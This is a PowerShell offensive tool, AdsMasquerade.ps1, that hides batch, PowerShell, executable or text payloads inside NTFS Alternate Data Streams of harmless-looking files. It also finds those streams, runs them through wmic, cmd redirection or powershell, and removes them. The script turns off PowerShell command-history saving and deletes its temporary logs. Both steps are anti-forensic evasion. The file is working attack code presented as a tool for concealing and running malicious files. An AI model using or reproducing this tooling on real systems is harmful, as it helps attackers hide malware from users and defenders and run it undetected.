<#
.SYNOPSIS
   Hidde scripts {txt|bat|ps1|exe} on $DATA records (ADS)

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: BitsTransfer
   PS cmdlet Dev version: v1.0.2
   
.DESCRIPTION
   Alternate Data Streams (ADS) have been around since the introduction
   of windows NTFS. Basically ADS can be used to hide the presence of a
   secret or malicious file inside the file record of an innocent file.

.NOTES
   Required Dependencies: Payload.bat|ps1|txt|exe + legit.txt
   This module hiddes {txt|bat|ps1|exe} $DATA inside ADS records.
   Remark: Payload.[extension] + legit.txt must be on the same dir.

.Parameter ADS
   Accepts arguments: Enum, Create, Exec and Clear

.Parameter StreamData
   Accepts the absolute \ relative path of Payload. [Bat | ps1 | txt | exe]
   which will be incorporated into a legitimate text file ADS $DATA Stream. 

.Parameter InTextFile
   Accepts the absolute \ relative path of legitimate text file
   which will be embedded with payload.[extension] ADS $DATA Stream.

.Parameter StartDir
   This Parameters its used to reduce the recursive search time.
   If used -ADS Enum @arg to search for text files with $DATA Stream

.EXAMPLE
   PS C:\> Get-Help .\AdsMasquerade.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Enum -StreamData "payload.bat" -StartDir "$Env:TMP"
   Search recursive for payload.bat ADS stream record existence, starting on -StartDir [ dir ]

.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Create -StreamData "Payload.bat" -InTextFile "legit.txt"
   Hidde the data of Payload.bat script inside legit.txt ADS stream $DATA record

.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Exec -StreamData "payload.bat" -InTextFile "legit.mp3"
   Execute\Access the alternate data stream of the sellected -InTextFile [ file ]

.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Clear -StreamData "Payload.bat" -InTextFile "legit.txt"
   Delete payload.bat ADS $DATA stream from legit.txt text file records

.INPUTS
   None. You cannot pipe objects into AdsMasquerade.ps1

.OUTPUTS
   AlternateDataStream
   -------------------
   C:\Users\pedro\AppData\Local\Temp\legit.txt

   [cmd prompt] AccessHiddenData
   -----------------------------
   wmic.exe process call create "C:\Users\pedro\AppData\Local\Temp\legit.txt:payload.exe"

.LINK
   https://davidhamann.de/2019/02/23/hidden-in-plain-sight-alternate-data-streams
   https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams
   https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/ADS.md
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$StreamData="false",
   [string]$InTextFile="false",
   [string]$StartDir="false",
   [string]$ADS="false"
)


Write-Host ""
## Local variable declarations
$ADSDataName = $InTextFile.split('\')[-1]   ## Strip filename from path
$ParseDataName = $StreamData.split('\')[-1] ## Strip filename from path
$Working_Directory = pwd|Select-Object -ExpandProperty Path
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
If($StartDir -ieq "false"){## Set working dir if not set by user
    $StartDir = "$Working_Directory"
}


If($ADS -ieq "Enum"){

    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
       Helper - Enum files containing payload $DATA records (ADS)

    .NOTES
       Optional: -StartDir [ dir ] will reduce the search time
       Remark: If -StartDir its not set, then redpill will use
       redpill script working directory to start search recursive.
       Supported Payload Extensions: txt | bat | ps1 | exe

    .EXAMPLE
        .\AdsMasquerade.ps1 -ADS Enum -StreamData "payload.bat" -StartDir "$Env:TMP"
        Search recursive for payload.bat ADS stream record existence, starting on -StartDir [ dir ]

    .OUTPUTS
       Files containing payload $DATA records
       --------------------------------------
       Stream      : Payload.bat
       PSChildName : legit.txt:Payload.bat
       FileName    : C:\Users\pedro\Desktop\legit.txt
    #>

    ## Make sure mandatory parameters are set
    If($StreamData -ieq "false"){
        echo "`nFiles containing payload `$DATA records" > $Env:TMP\jdgfjd.log
        echo "--------------------------------------" >> $Env:TMP\jdgfjd.log
        echo "[error] -StreamData mandatory parameter required!`n`n" >> $Env:TMP\jdgfjd.log
        Get-Content -Path "$Env:TMP\jdgfjd.log"
        Remove-Item -Path "$Env:TMP\jdgfjd.log" -Force
        exit ## Exit @AdsMasquerade
    }

    gci "$StartDir" -Recurse | % { gi $_.FullName -stream * } |
        Where-Object Stream -ieq "${ParseDataName}" |
        Format-List Stream,PSChildName,FileName > $Env:TMP\lksfdv.log

    ## Make sure that the logfile exists and contains any data
    $DataStream = [String]::IsNullOrWhiteSpace((Get-Content -Path "$Env:TMP\lksfdv.log" -EA SilentlyContinue))
    If(-not($DataStream -ieq "True")){## ADS $DATA records found!

        ## Build output Table
        echo "`nFiles containing payload `$DATA records" > $Env:TMP\iuobla.log
        echo "--------------------------------------" >> $Env:TMP\iuobla.log
        Get-Content -Path "$Env:TMP\iuobla.log"
        Remove-Item -Path "$Env:TMP\iuobla.log" -Force
        ## remove the two top lines of logfile
        (Get-Content -Path "$Env:TMP\lksfdv.log"|Select-Object -Skip 2)|Set-Content -Path "$Env:TMP\lksfdv.log"
        Get-Content -Path "$Env:TMP\lksfdv.log"
        Remove-Item -Path "$Env:TMP\lksfdv.log" -Force

    }Else{## None ADS $DATA records found!

        echo "`nFiles containing payload `$DATA records" > $Env:TMP\jdgfjd.log
        echo "--------------------------------------" >> $Env:TMP\jdgfjd.log
        echo "[error] None ADS `$DATA records found under: $StartDir" >> $Env:TMP\jdgfjd.log
        echo "Imput a diferent -StartDir directory where to start search recursive!`n`n" >> $Env:TMP\jdgfjd.log
        Get-Content -Path "$Env:TMP\jdgfjd.log"
        Remove-Item -Path "$Env:TMP\jdgfjd.log" -Force
        If(Test-Path -Path "$Env:TMP\lksfdv.log" -EA SilentlyContinue){
            Remove-Item -Path "$Env:TMP\lksfdv.log" -Force
        }
    }

}ElseIf($ADS -ieq "Exec"){

    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
       Helper - Execute scripts of $DATA records (ADS)

    .NOTES
       Requirements: Auto-Download of ADSBatExec.bat from my github
       Supported Payload Extensions: txt | bat | ps1 | exe

    .EXAMPLE
       PS C:\> .\AdsMasquerade.ps1 -ADS Exec -StreamData "payload.bat" -InTextFile "legit.mp3"
       Execute\Access the alternate data stream of the sellected -InTextFile [ file ]

    .OUTPUTS
       Executing ADS $Data of
       ----------------------
       C:\Users\pedro\AppData\Local\Temp\legit.txt
    #>

    ## Make sure -InTextFile exists
    If(-not(Test-Path -Path $InTextFile -ErrorAction SilentlyContinue)){
        echo "Executing ADS `$Data of" > $Env:TMP\kbfdjk.log
        echo "----------------------" >> $Env:TMP\kbfdjk.log
        echo "[error] Not found: $InTextFile `n`n" >> $Env:TMP\kbfdjk.log
        Get-Content -Path "$Env:TMP\kbfdjk.log"
        Remove-Item -Path "$Env:TMP\kbfdjk.log" -Force
        exit ## Exit @AdsMasquerade    
    }

    ## Make sure legit.txt contains any ADS $DATA
    # If yes then set -StartDir variable to -InTextFile
    $RawPath = $InTextFile -replace "\\${ADSDataName}",""
    $CheckAds = gci "$InTextFile" -EA SilentlyContinue | % { gi $_.FullName -stream * } |
        Where-Object Stream -ieq "${ParseDataName}" |
        Select-Object -ExpandProperty Stream

    If($CheckAds -ieq "$ParseDataName"){
        If($InTextFile -Match '\\'){## Check for Absoluct Path inputs
            $StartDir = $RawPath
        }Else{## Required files are in current directory
            $StartDir = $Working_Directory
        }
    }Else{## Required Dependencies NOT meet
        echo "Executing ADS `$Data of" > $Env:TMP\kbfdjk.log
        echo "----------------------" >> $Env:TMP\kbfdjk.log
        echo "[error] $ADSDataName does not contain any ADS `$DATA!`n`n" >> $Env:TMP\kbfdjk.log
        Get-Content -Path "$Env:TMP\kbfdjk.log"
        Remove-Item -Path "$Env:TMP\kbfdjk.log" -Force
        exit ## Exit @AdsMasquerade
    }

    If($ParseDataName -Match '.txt$'){

        echo "Executing ADS `$Data of" > $Env:TMP\fdllkf.log
        echo "----------------------" >> $Env:TMP\fdllkf.log
        echo "$InTextFile`n`n" >> $Env:TMP\fdllkf.log
        Get-Content -Path "$Env:TMP\fdllkf.log"
        Remove-Item -Path "$Env:TMP\fdllkf.log" -Force
        Start-Process notepad.exe ${InTextFile}:${ParseDataName}

    }ElseIf($ParseDataName -Match '.bat$'){

        echo "Executing ADS `$Data of" > $Env:TMP\fdllkf.log
        echo "----------------------" >> $Env:TMP\fdllkf.log
        echo "$InTextFile`n`n" >> $Env:TMP\fdllkf.log
        Get-Content -Path "$Env:TMP\fdllkf.log"
        Remove-Item -Path "$Env:TMP\fdllkf.log" -Force
        ## Nice trick to be abble to execute cmd stdin { < } on PS 
        cmd.exe /c "cmd.exe - < ${InTextFile}:${ParseDataName}"

    }ElseIf($ParseDataName -Match '.ps1$'){

        echo "Executing ADS `$Data of" > $Env:TMP\fdllkf.log
        echo "----------------------" >> $Env:TMP\fdllkf.log
        echo "$InTextFile`n`n" >> $Env:TMP\fdllkf.log
        Get-Content -Path "$Env:TMP\fdllkf.log"
        Remove-Item -Path "$Env:TMP\fdllkf.log" -Force
        powershell .\${InTextFile}:${ParseDataName}

    }ElseIf($ParseDataName -Match '.exe$'){

        echo "Executing ADS `$Data of" > $Env:TMP\fdllkf.log
        echo "----------------------" >> $Env:TMP\fdllkf.log
        echo "$InTextFile`n`n" >> $Env:TMP\fdllkf.log
        Get-Content -Path "$Env:TMP\fdllkf.log"
        Remove-Item -Path "$Env:TMP\fdllkf.log" -Force
        ## TODO: Replace wmic.exe syscall by Start-Proces
        # Start-Process -WindowStyle hidden wmic.exe -ArgumentList "process", "call", "create ${InTextFile}:${ParseDataName}" -EA SilentlyContinue|Out-Null
        wmic.exe process call create "${InTextFile}:${ParseDataName}"

    }ElseIf($ParseDataName -Match '.mp3$'){

        echo "Executing ADS `$Data of" > $Env:TMP\fdllkf.log
        echo "----------------------" >> $Env:TMP\fdllkf.log
        echo "$InTextFile`n`n" >> $Env:TMP\fdllkf.log
        Get-Content -Path "$Env:TMP\fdllkf.log"
        Remove-Item -Path "$Env:TMP\fdllkf.log" -Force
        wmplayer.exe "${InTextFile}:${ParseDataName}"

    }

}ElseIf($ADS -ieq "Create"){

    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
       Helper - Hidde scripts {txt|bat|ps1|exe} on $DATA records (ADS)

    .NOTES
       Requirements: Auto-Download of ADS.bat from my github
       Supported Payload Extensions: txt | bat | ps1 | exe

    .EXAMPLE
       PS C:\> .\AdsMasquerade.ps1 -ADS Create -StreamData "Payload.bat" -InTextFile "legit.txt"
       Hidde the data of Payload.bat script inside legit.txt ADS stream $DATA record

    .OUTPUTS
       AlternateDataStream
       -------------------
       C:\Users\pedro\AppData\Local\Temp\legit.txt

       [cmd prompt] AccessHiddenData
       -----------------------------
       cmd.exe - < legit.txt:payload.bat&exit
    #>

    ## Make sure payload.bat and legit.exe are in the same dir
    # If yes then set -StartDir variable to -InTextFile directory
    If($InTextFile -Match '\\'){## Check for Absoluct Path inputs
        $CheckLegit = $InTextFile -replace "\\${ADSDataName}",""
        $CheckPaylo = $StreamData -replace "\\${ParseDataName}",""
    }Else{## Required files are in current directory
        $CheckLegit = $Working_Directory
        $CheckPaylo = $Working_Directory
    }

    If($CheckLegit -ieq "$CheckPaylo"){

        ## The two files are present
        If($CheckLegit -Match '\\'){
            ## Set -StartDir to -InTextFile directory
            $StartDir = $CheckLegit
        }Else{## Required files are in current directory
            $StartDir = $Working_Directory
        }

    }Else{## Required Dependencies NOT meet
        echo "`nAlternateDataStream" > $Env:TMP\kbfdjk.log
        echo "-------------------" >> $Env:TMP\kbfdjk.log
        echo "[error] $ADSDataName and $ParseDataName must be in the same dir!`n`n" >> $Env:TMP\kbfdjk.log
        Get-Content -Path "$Env:TMP\kbfdjk.log"
        Remove-Item -Path "$Env:TMP\kbfdjk.log" -Force
        exit ## Exit @AdsMasquerade
    }

    ## Check if legit text file exists
    If(Test-Path -Path "$InTextFile" -EA SilentlyContinue){

        ## Hidde Payload data inside text file ADS $DATA stream ^_^
        Set-Content -Path "$InTextFile" -Value $(Get-Content -Path "$StreamData") -Stream $ParseDataName

    }Else{## Error legit text file not found

        echo "`nAlternateDataStream" > $Env:TMP\gdppdi.log
        echo "-------------------" >> $Env:TMP\gdppdi.log
        echo "[error] Not found: $InTextFile `n`n" >> $Env:TMP\gdppdi.log
        Get-Content -Path "$Env:TMP\gdppdi.log"
        Remove-Item -Path "$Env:TMP\gdppdi.log" -Force
        exit ## Exit @AdsMasquerade
    }

    ## Building the output Tables
    If($ParseDataName -Match '.ps1$'){

        ## Powershell output Table
        echo "`nAlternateDataStream" > $Env:TMP\gdfdod.log
        echo "-------------------" >> $Env:TMP\gdfdod.log
        echo "$InTextFile" >> $Env:TMP\gdfdod.log

        echo "`n[PS prompt] AccessHiddenData" >> $Env:TMP\gdfdod.log
        echo "----------------------------" >> $Env:TMP\gdfdod.log
        echo "powershell .\${InTextFile}:${ParseDataName}`n" >> $Env:TMP\gdfdod.log
        Get-Content -Path "$Env:TMP\gdfdod.log"
        Remove-Item -Path "$Env:TMP\gdfdod.log" -Force

    }ElseIf($ParseDataName -Match '.bat$'){

        ## Batch output Table
        echo "`nAlternateDataStream" > $Env:TMP\gdfdod.log
        echo "-------------------" >> $Env:TMP\gdfdod.log
        echo "$InTextFile" >> $Env:TMP\gdfdod.log

        echo "`n[cmd prompt] AccessHiddenData" >> $Env:TMP\gdfdod.log
        echo "-----------------------------" >> $Env:TMP\gdfdod.log
        echo "cmd.exe - < ${InTextFile}:${ParseDataName}`n" >> $Env:TMP\gdfdod.log
        Get-Content -Path "$Env:TMP\gdfdod.log"
        Remove-Item -Path "$Env:TMP\gdfdod.log" -Force

    }ElseIf($ParseDataName -Match '.txt$'){

        ## Text file output Table
        echo "`nAlternateDataStream" > $Env:TMP\gdfdod.log
        echo "-------------------" >> $Env:TMP\gdfdod.log
        echo "$InTextFile" >> $Env:TMP\gdfdod.log

        echo "`n[cmd prompt] AccessHiddenData" >> $Env:TMP\gdfdod.log
        echo "-----------------------------" >> $Env:TMP\gdfdod.log
        echo "cmd /c notepad.exe ${InTextFile}:${ParseDataName}`n" >> $Env:TMP\gdfdod.log
        Get-Content -Path "$Env:TMP\gdfdod.log"
        Remove-Item -Path "$Env:TMP\gdfdod.log" -Force

    }ElseIf($ParseDataName -Match '.exe$'){

        ## Binary.exe output Table
        echo "`nAlternateDataStream" > $Env:TMP\gdfdod.log
        echo "-------------------" >> $Env:TMP\gdfdod.log
        echo "$InTextFile" >> $Env:TMP\gdfdod.log

        echo "`n[cmd prompt] AccessHiddenData" >> $Env:TMP\gdfdod.log
        echo "-----------------------------" >> $Env:TMP\gdfdod.log
        echo "wmic.exe process call create `"${InTextFile}:${ParseDataName}`"`n" >> $Env:TMP\gdfdod.log
        Get-Content -Path "$Env:TMP\gdfdod.log"
        Remove-Item -Path "$Env:TMP\gdfdod.log" -Force

    }ElseIf($ParseDataName -Match '.mp3$'){

        ## filename.mp3 output Table
        echo "`nAlternateDataStream" > $Env:TMP\gdfdod.log
        echo "-------------------" >> $Env:TMP\gdfdod.log
        echo "$InTextFile" >> $Env:TMP\gdfdod.log

        echo "`n[cmd prompt] AccessHiddenData" >> $Env:TMP\gdfdod.log
        echo "------------------------------" >> $Env:TMP\gdfdod.log
        echo "wmplayer.exe `"${InTextFile}:${ParseDataName}`"`n" >> $Env:TMP\gdfdod.log
        Get-Content -Path "$Env:TMP\gdfdod.log"
        Remove-Item -Path "$Env:TMP\gdfdod.log" -Force

    }

}ElseIf($ADS -ieq "Clear"){

    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
       Helper - Delete payload $DATA stream form file records (ADS)

    .EXAMPLE
       PS C:\> .\AdsMasquerade.ps1 -ADS Clear -StreamData "Payload.bat" -InTextFile "legit.txt"
       Delete payload.bat ADS $DATA stream from legit.txt text file records

    .OUTPUTS
       Clean AlternateDataStream
       -------------------------
       Stream      : :$DATA
       PSChildName : legit.txt
       FileName    : C:\Users\pedro\Desktop\legit.txt
       Status      : Payload.bat Stream $DATA cleared!
    #>

    ## Make sure -InTextFile exists
    If(Test-Path $InTextFile -EA SilentlyContinue){

        ## Build reeport logfile
        gci "$InTextFile" | % { gi $_.FullName -stream * } |
            Where-Object Stream -ieq "${ParseDataName}" |
            Format-List Stream,PSChildName,FileName > $Env:TMP\gfscgsvs.log

        ## Make sure gfscgsvs.log exists
        If(Test-Path -Path "$Env:TMP\gfscgsvs.log" -EA SilentlyContinue){

            ## Make sure gfscgsvs.log contains any $DATA stream
            $Msopcads = Get-Content -Path "$Env:TMP\gfscgsvs.log"
            If($Msopcads -Match "$ParseDataName"){

                ## Delete payload $DATA stream from text file
                Remove-Item -Path "$InTextFile" -Stream $ParseDataName -EA SilentlyContinue

                ## Build Output Table
                echo "Clean AlternateDataStream" > $Env:TMP\OutputTable.log
                echo "-------------------------" >> $Env:TMP\OutputTable.log
                echo "Stream      : :`$DATA" >> $Env:TMP\OutputTable.log
                echo "PSChildName : $ADSDataName" >> $Env:TMP\OutputTable.log
                echo "FileName    : $InTextFile" >> $Env:TMP\OutputTable.log
                echo "Status      : Payload.bat Stream `$DATA cleared!`n`n" >> $Env:TMP\OutputTable.log
                Get-Content -Path "$Env:TMP\OutputTable.log"
                Remove-item -Path "$Env:TMP\OutputTable.log" -Force
                Remove-item -Path "$Env:TMP\gfscgsvs.log" -Force

            }Else{
            
                ## error: logfile does NOT contain any $DATA streams!
                echo "Clean AlternateDataStream" > $Env:TMP\lsctt.log
                echo "-------------------------" >> $Env:TMP\lsctt.log
                echo "[error] logfile does NOT contain any `$DATA streams!`n`n" >> $Env:TMP\lsctt.log
                Get-Content -Path "$Env:TMP\lsctt.log"
                Remove-Item -Path "$Env:TMP\lsctt.log" -Force
                Remove-item -Path "$Env:TMP\gfscgsvs.log" -Force
            }

        }Else{

            ## error: logfile not found!
            echo "Clean AlternateDataStream" > $Env:TMP\lsctt.log
            echo "-------------------------" >> $Env:TMP\lsctt.log
            echo "[error] logfile not found!`n`n" >> $Env:TMP\lsctt.log
            Get-Content -Path "$Env:TMP\lsctt.log"
            Remove-Item -Path "$Env:TMP\lsctt.log" -Force
        }

    }Else{

        ## -InTextFile NOT found error
        echo "Clean AlternateDataStream" > $Env:TMP\lsctt.log
        echo "-------------------------" >> $Env:TMP\lsctt.log
        echo "[error] Not found: $InTextFile `n`n" >> $Env:TMP\lsctt.log
        Get-Content -Path "$Env:TMP\lsctt.log"
        Remove-Item -Path "$Env:TMP\lsctt.log" -Force
    }
}


## Clean old logs left behind
Write-Host "";Start-Sleep -Seconds 1
If(Test-Path -Path "ddsdsds" -EA SilentlyContinue){
    Remove-Item -Path "ddsdsds" -Force
}
